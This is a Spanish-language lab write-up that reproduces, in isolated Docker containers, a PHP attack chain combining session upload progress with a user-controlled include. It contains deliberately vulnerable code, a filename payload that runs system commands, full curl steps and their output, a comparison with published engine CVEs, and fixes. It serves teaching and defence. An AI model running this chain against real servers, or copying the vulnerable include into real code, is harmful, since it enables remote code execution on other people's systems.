# Laboratorio — escritura en la sesión y ejecución por inclusión

Una aplicación web guarda en disco una ficha por visitante. Si esa ficha puede recibir texto que escribe el visitante, y la aplicación después abre la ficha y la lee como si fuera código, el visitante acaba ejecutando lo que quiera dentro del servidor. Es como dejar que alguien escriba en la etiqueta de su taquilla y que el conserje, al abrirla, lea la etiqueta en voz alta como si fueran órdenes.

Este laboratorio monta ese escenario en local, con dos contenedores, sin salida a Internet, y deja registrado qué se ejecutó y qué se observó. No reproduce PHP2Shell: ese es un fallo del motor de PHP y aquí el fallo está en el código de la aplicación. La sección [Caso real](#caso-real-php2shell) explica la diferencia.

> **Estado:** Validado en local.
>
> **Evidencia:** [2026-11-02-11-upload-progress-include](../../../laboratorio-final/evidencias/2026-11-02-11-upload-progress-include/README.md).

## Qué hay dentro

| Pieza | Contenido |
|---|---|
| `docker-compose.yml` | Dos contenedores: `web` (PHP 8.2.34 con Apache) y `gate` (reenvío) |
| `html/index.php` | Aplicación vulnerable: `session_start()` e `include` de un parámetro de la URL |
| `html/pages/home.php`, `html/pages/prueba.php` | Páginas legítimas para que la aplicación funcione con normalidad |

La aplicación completa son quince líneas:

```php
session_start();
$page = $_GET['page'] ?? __DIR__ . '/pages/home.php';
...
<?php include $page; ?>
```

Dos decisiones deliberadas:

- **`session_start()` sin más.** PHP crea una sesión vacía para cualquier visitante, sin pedir credenciales. Es el comportamiento por defecto de la mayoría de aplicaciones PHP.
- **`include $page` sin lista de valores permitidos.** Cualquiera puede pedir que se incluya un fichero del servidor. Esa línea es el fallo; sin ella, la cadena no existe.

## Por qué dos contenedores

El contenedor `web` vive en una red interna (`internal: true`) sin ruta a Internet. Docker no permite publicar puertos desde una red interna, así que `gate` —un contenedor mínimo con `socat`, que solo copia bytes de un lado a otro— se sienta entre el equipo y la web. Solo publica `127.0.0.1:8088`, de modo que el laboratorio no es alcanzable desde la red local.

La web no gana salida por compartir red con `gate`: `socat` abre conexiones nuevas hacia la web, no enruta paquetes de una red a otra, y el contenedor `web` solo tiene ruta por la red sellada.

## La cadena, paso a paso

1. **PHP abre una sesión.** El cliente manda una cookie `PHPSESSID=prueba123` y PHP crea `/tmp/sess_prueba123`, vacío y propiedad de `www-data`.
2. **La subida con progreso escribe dentro.** Con `session.upload_progress` activado (viene así por defecto), PHP anota el progreso de una subida en el fichero de sesión. Entre los datos anotados está el **nombre del archivo**, que elige quien sube.
3. **La subida se queda a medias.** Si termina, la limpieza borra la nota. Manteniéndola colgada, el nombre malicioso permanece escrito en el fichero de sesión.
4. **La aplicación incluye el fichero.** `?page=/tmp/sess_prueba123` hace que `include` abra el fichero de sesión. PHP ejecuta lo que encuentra entre `<?php` y `?>`, y el resto lo imprime como texto.

Los pasos 1 a 3 son comportamiento de PHP. El paso 4 es el fallo de la aplicación.

## Cómo se ejecuta

```bash
cd 11-hacking-etico-api/lab/upload-progress-include   # desde la raíz del clon
docker compose up -d
sleep 3
curl -sS -o /dev/null -w 'web: %{http_code}\n' http://127.0.0.1:8088/
docker compose exec web php -v | head -1
docker compose exec web php -r 'echo @fsockopen("1.1.1.1",443,$e,$s,3) ? "SALE\n" : "sin salida\n";'
```

`web: 200` en la primera petición, `PHP 8.2.34` en la segunda y `sin salida` en la tercera. Si la tercera dice `SALE`, el contenedor tiene salida a Internet y el laboratorio no está aislado: se para y se revisa la red antes de seguir.

La cadena completa, con la subida colgada y la ejecución:

```bash
head -c 400000 /dev/zero > /tmp/big.bin
curl -sS --limit-rate 8k -b 'PHPSESSID=prueba123' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=pwn' \
  -F "file=@/tmp/big.bin;filename=<?php system('id')?>.txt" \
  http://127.0.0.1:8088/ >/dev/null &
sleep 3
docker compose exec web cat /tmp/sess_prueba123; echo
curl -sS -b 'PHPSESSID=prueba123' \
  'http://127.0.0.1:8088/?page=/tmp/sess_prueba123' | grep -o 'uid=[^<]*'
kill %1 2>/dev/null
wait 2>/dev/null
```

Resultado observado:

```text
upload_progress_pwn|a:5:{...s:4:"name";s:24:"<?php system('id')?>.txt";...}
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El `33` es la cuenta del servidor web dentro del contenedor. No es root, no es el usuario del equipo y no ha salido de la máquina.

**Nota de herramienta.** El nombre del archivo viaja en una cabecera del formulario, así que `curl` estropea el payload si lleva comillas dobles (las convierte en `%22`) o punto y coma (lo interpreta como separador de opciones de `-F`). De ahí las comillas simples y la ausencia de `;` antes de `?>`. Un cliente que hable el protocolo a mano no tiene ese problema.

## Prueba de control: la versión parcheada

Si el fallo estuviera en el motor de PHP, la cadena dejaría de funcionar al actualizar. Se repitió sobre `php:8.2.35`, la versión que corrige PHP2Shell, y volvió a devolver `uid=33(www-data)`. La captura está en `control-8.2.35.txt` de la evidencia.

Eso demuestra dos cosas a la vez: la cadena funciona en la versión vulnerable y en la parcheada, luego el agujero no es el del motor; y quien solo actualice PHP seguirá teniendo el problema mientras el código haga `include` de una ruta elegida por el usuario.

## Caso real: PHP2Shell

En octubre de 2026 se publicaron dos fallos del **motor** de PHP, bautizados como *php2shell*, que permiten ejecución remota de código sin autenticación y sin que la aplicación haga nada malo:

| CVE | Qué falla | Ejecución |
|---|---|---|
| [CVE-2026-109618](https://www.cve.org/CVERecord?id=CVE-2026-109618) | Al quedarse sin memoria a mitad de preparar la petición, PHP sale por un atajo que no contabiliza y deja la memoria de la petición en estado inválido; el cierre de petición la procesa | Antes de que se ejecute código de la aplicación |
| [CVE-2026-109619](https://www.cve.org/CVERecord?id=CVE-2026-109619) | Estado interno de una petición sobrevive en el proceso y la siguiente lo usa antes de reinicializarlo | Entre peticiones, en el mismo proceso |

Datos verificados en las fuentes:

- **Gravedad:** 9,2 con CVSS 4.0 en ambos avisos.
- **Afectados:** todas las ramas soportadas por debajo de 8.2.35, 8.3.36, 8.4.27 y 8.5.12, en Apache con `mod_php`, PHP-FPM, `php-cgi`, FrankenPHP y LiteSpeed.
- **Corregido en:** 8.2.35, 8.3.36, 8.4.27 y 8.5.12.
- **Explotación real:** CISA los añadió a su catálogo de vulnerabilidades explotadas (KEV) el 26 de octubre de 2026.

La diferencia con este laboratorio está en el punto de partida. En PHP2Shell el atacante no necesita que la aplicación tenga un `include` mal escrito, ni una sesión, ni una subida: el daño ocurre en la preparación de la petición. Aquí el atacante necesita las tres cosas, y la última —el `include`— la pone el código de la aplicación.

Hay un detalle que confunde y conviene decirlo: el aviso de CVE-2026-109619 menciona la subida con progreso de sesión como una de las operaciones que pueden consumir estado viejo del motor. Es la misma función de PHP, pero el mecanismo es distinto: en el fallo real sirve para leer estado interno corrupto; aquí sirve para que el atacante escriba su texto en un fichero que luego se incluye.

Por eso este laboratorio **no** se presenta como reproducción de PHP2Shell. Reproduce una cadena de aplicación que sigue funcionando después de parchear el motor, y ese contraste es justamente lo que la evidencia documenta.

## Cómo se corrige

| Medida | Qué corta |
|---|---|
| Lista cerrada de páginas permitidas en lugar de `include $_GET[...]` | El paso 4; sin él no hay ejecución |
| `session.upload_progress.enabled=0` si no se usa | El paso 2 |
| `open_basedir` y permisos del directorio de sesiones | Que un `include` alcance ficheros fuera de la aplicación |
| Actualizar PHP a 8.2.35 o superior | PHP2Shell, que es otro problema |

La primera medida es la que corresponde al código: una aplicación no debe incluir rutas que elija el visitante.

## Límites

- El contenedor no tiene salida a Internet ni resolución externa; no se ha probado nada contra sistemas de terceros.
- La ejecución se limita a la cuenta `www-data` dentro del contenedor. No hay escalada, persistencia ni movimiento lateral, y no se ha intentado.
- El laboratorio demuestra la cadena técnica, no un pentest: no hay explotación de un objetivo real, ni informe de hallazgos sobre un cliente.
- La cadena depende de que la subida se quede colgada; un servidor con límites de tiempo muy bajos o sin `session.upload_progress` la rompe.

## Limpieza

```bash
docker compose down
rm -f /tmp/big.bin
```

Los contenedores y las redes se eliminan; los ficheros de sesión viven dentro del contenedor y desaparecen con él.

## Referencias

- PHP, aviso de seguridad del 21 de octubre de 2026: <https://www.php.net/archive/2026.php#2026-10-21-5>
- CISA, *Critical Vulnerabilities in PHP Require Immediate Patching*: <https://www.cisa.gov/news-events/alerts/2026/10/21/critical-vulnerabilities-php-require-immediate-patching>
- Aviso de CVE-2026-109618 (RCE por corrupción en OOM): <https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w>
- Aviso de CVE-2026-109619 (RCE por estado global obsoleto): <https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp>
- Documentación de `session.upload_progress`: <https://www.php.net/manual/en/session.upload-progress.php>
